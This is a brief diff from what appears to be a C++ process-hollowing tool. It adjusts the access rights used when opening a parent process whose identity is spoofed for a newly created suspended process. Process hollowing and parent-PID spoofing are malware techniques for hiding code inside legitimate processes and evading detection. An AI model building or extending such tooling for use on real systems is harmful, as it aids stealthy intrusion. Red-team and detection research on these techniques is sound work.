@@ -57,7 +57,7 @@ bool ProcessHollower::create_suspended_process(const wchar_t* target_path) {
         }
 
         // Get parent process handle to spoof
-        HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parent_pid);
+        HANDLE hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
         if (!hParentProcess) {
             std::cout << "[-] OpenProcess (parent PID " << parent_pid << ") failed: " << GetLastError() << std::endl << std::flush;
             DeleteProcThreadAttributeList(lpAttributeList);
